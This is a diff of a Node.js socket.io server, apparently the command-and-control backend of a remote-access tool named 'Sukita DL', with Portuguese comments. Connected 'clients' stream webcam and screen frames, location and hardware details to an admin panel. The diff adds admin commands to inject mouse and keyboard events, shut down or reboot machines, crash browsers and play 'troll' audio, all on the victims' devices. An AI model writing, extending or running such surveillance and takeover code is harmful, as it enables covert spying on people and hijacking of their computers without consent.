@@ -1,112 +1,89 @@
-const express   = require('express');
-const http      = require('http');
-const path      = require('path');
-const { Server } = require('socket.io');
+/* Sukita DL  ·  backend v3.2 */
+const express = require('express');
+const http    = require('http');
+const path    = require('path');
 const { v4: uuid } = require('uuid');
+const { Server }   = require('socket.io');
 
 const app    = express();
 const server = http.createServer(app);
-const io     = new Server(server);
+const io     = new Server(server, { cors:{origin:'*'} });
 
-app.use(express.static(path.join(__dirname,'public')));
+app.use(express.static(path.join(__dirname, 'public')));
 
-const clients = new Map();
+/* ─── mapa de clientes ─── */
+const clients = new Map();                      // uuid → { socket, … }
 
+/* helper: emitir só para admins */
+io.toAdmins = () => ({
+  emit: (ev,data) => {
+    for(const s of io.sockets.sockets.values())
+      if(s.handshake.query.role === 'admin') s.emit(ev,data);
+  }
+});
+
+/* ─────────────────────────── conexões ─────────────────────────── */
 io.on('connection', socket=>{
   const role = socket.handshake.query.role;
 
-  /* ---------- CLIENTE ---------- */
-  if(role==='client'){
-    const id  = uuid();
-    const ip  = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
-    const ua  = socket.handshake.headers['user-agent'] || 'desconhecido';
+  /* ════════════════ CLIENTE (Python ou sp.html) ════════════════ */
+  if(role === 'client'){
+    const id = uuid();
+    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+    const ua = socket.handshake.headers['user-agent'] || '—';
 
     clients.set(id,{ uuid:id, ip, ua, connected_at:Date.now(),
-                     socket, watchers:[], screenWatchers:[] });
+                     socket, watchers:[], screenWatchers:[],
+                     location:null, hwinfo:null });
 
-    socket.emit('id',id);
+    socket.emit('id', id);
     broadcastClients();
 
-    socket.on('frame',dataURL=>{
-      const c = clients.get(id);
-      if(c) c.watchers.forEach(w=>io.to(w).emit('frame',{id,data:dataURL}));
+    /* vídeo & tela */
+    socket.on('frame',        d=> relay(id,'frame',d,'watchers'));
+    socket.on('screen-frame', d=> relay(id,'screen-frame',d,'screenWatchers'));
+
+    /* localização */
+    socket.on('location', loc=>{
+      const c=clients.get(id); if(c){ c.location=loc; io.toAdmins().emit('location-update',{uuid:id,loc}); }
     });
 
-    socket.on('screen-frame',dataURL=>{
-      const c = clients.get(id);
-      if(c) c.screenWatchers.forEach(w=>io.to(w).emit('screen-frame',{id,data:dataURL}));
+    /* hardware info */
+    socket.on('hwinfo', info=>{
+      const c=clients.get(id); if(c){
+        c.hwinfo = info;
+        broadcastClients();
+        io.toAdmins().emit('hwinfo-update',{uuid:id,info});
+      }
     });
 
-    socket.on('location',loc=>{
-      const c=clients.get(id);
-      if(c){ c.location=loc; broadcastLocation(id,loc); }
-    });
-
-    socket.on('disconnect',()=>{
-      clients.delete(id);
-      broadcastClients();
-    });
+    socket.on('disconnect', ()=>{ clients.delete(id); broadcastClients(); });
   }
 
-  /* ---------- ADMIN ---------- */
-  if(role==='admin'){
+  /* ═════════════════════ ADMIN (painel) ═════════════════════ */
+  if(role === 'admin'){
     socket.emit('clients', summary());
 
-    /* ----- Pedir/parar streams ----- */
-    socket.on('request-stream', uuid=>{
-      const c=clients.get(uuid);
-      if(c && !c.watchers.includes(socket.id)) c.watchers.push(socket.id);
-    });
-    socket.on('stop-stream', uuid=>{
-      const c=clients.get(uuid);
-      if(c) c.watchers = c.watchers.filter(x=>x!==socket.id);
-    });
+    /* pedir / parar streams */
+    socket.on('request-stream', uuid=> addWatcher(uuid,socket.id,'watchers'));
+    socket.on('stop-stream',    uuid=> delWatcher(uuid,socket.id,'watchers'));
+    socket.on('request-screen', uuid=> addWatcher(uuid,socket.id,'screenWatchers'));
+    socket.on('stop-screen',    uuid=> delWatcher(uuid,socket.id,'screenWatchers'));
 
-    socket.on('request-screen', uuid=>{
-      const c=clients.get(uuid);
-      if(c && !c.screenWatchers.includes(socket.id)) c.screenWatchers.push(socket.id);
-    });
-    socket.on('stop-screen', uuid=>{
-      const c=clients.get(uuid);
-      if(c) c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);
-    });
+    /* áudio / troll */
+    socket.on('ready-audio',  ({uuid,url,delay=0})=> timed(uuid,'play-audio',{url},delay));
+    socket.on('custom-audio', ({uuid,dataURL,delay=0})=> timed(uuid,'play-audio',{url:dataURL},delay));
+    socket.on('stop-audio',   uuid=> emit(uuid,'stop-audio'));
+    socket.on('crash-browser',uuid=> emit(uuid,'crash-browser'));
 
-    /* ----- Áudios ----- */
-    socket.on('troll-audio', uuid=>{
-      const c=clients.get(uuid);
-      if(c) c.socket.emit('play-audio',{url:'https://actions.google.com/sounds/v1/ambiences/subway_station_nyc.ogg'});
-    });
+    /* novo controle / energia / hw info */
+    socket.on('request-hwinfo', uuid=> emit(uuid,'request-hwinfo'));
+    socket.on('shutdown',       uuid=> emit(uuid,'shutdown'));
+    socket.on('reboot',         uuid=> emit(uuid,'reboot'));
+    socket.on('mouse-event',    ({uuid,ev})=> emit(uuid,'mouse-event',ev));
+    socket.on('key-event',      ({uuid,ev})=> emit(uuid,'key-event',ev));
 
-    // gravação personalizada (delay em s)
-    socket.on('custom-audio',({uuid,dataURL,delay=0})=>{
-      const c=clients.get(uuid);
-      if(c){
-        setTimeout(()=>{
-          c.socket.emit('play-audio',{url:dataURL});
-        }, delay*1000);
-      }
-    });
-
-    // áudio pronto da lista (delay em s)
-    socket.on('ready-audio',({uuid,url,delay=0})=>{
-      const c=clients.get(uuid);
-      if(c){
-        setTimeout(()=>{
-          c.socket.emit('play-audio',{url});
-        }, delay*1000);
-      }
-    });
-
-    socket.on('stop-audio', uuid=>{
-      const c=clients.get(uuid);
-      if(c) c.socket.emit('stop-audio');
-    });
-
-    socket.on('crash-browser', uuid=>{
-      const c=clients.get(uuid);
-      if(c) c.socket.emit('crash-browser');
-    });
-
+    /* admin caiu → limpa watchers */
     socket.on('disconnect',()=>{
       for(const c of clients.values()){
         c.watchers       = c.watchers.filter(x=>x!==socket.id);
@@ -116,21 +93,28 @@ io.on('connection', socket=>{
   }
 });
 
-/* ---------- util ---------- */
+/* ───────────── helpers gerais ───────────── */
 function summary(){
   return Array.from(clients.values()).map(c=>({
-    uuid:c.uuid, ip:c.ip, ua:c.ua,
-    connected_at:c.connected_at, location:c.location
+    uuid:c.uuid, ip:c.ip, ua:c.ua, connected_at:c.connected_at,
+    location:c.location, hwinfo:c.hwinfo
   }));
 }
-function broadcastClients(){
-  const list=summary();
-  for(const s of io.sockets.sockets.values())
-    if(s.handshake.query.role==='admin') s.emit('clients',list);
-}
-function broadcastLocation(uuid,loc){
-  for(const s of io.sockets.sockets.values())
-    if(s.handshake.query.role==='admin') s.emit('location-update',{uuid,loc});
-}
+function broadcastClients(){ io.toAdmins().emit('clients', summary()); }
 
-server.listen(3000,()=>console.log('✔ http://localhost:3000'));
+function relay(uuid, evt, data, list){
+  const c=clients.get(uuid);
+  if(c) c[list].forEach(w=> io.to(w).emit(evt,{id:uuid,data}));
+}
+function addWatcher(uuid,sid,list){
+  const c=clients.get(uuid); if(c && !c[list].includes(sid)) c[list].push(sid);
+}
+function delWatcher(uuid,sid,list){
+  const c=clients.get(uuid); if(c) c[list]=c[list].filter(x=>x!==sid);
+}
+function emit(uuid,evt,data){ const c=clients.get(uuid); if(c) c.socket.emit(evt,data); }
+function timed(uuid,evt,data,delay){ setTimeout(()=>emit(uuid,evt,data),delay*1000); }
+
+/* ─── start ─── */
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, ()=> console.log(`✔  http://localhost:${PORT}`));
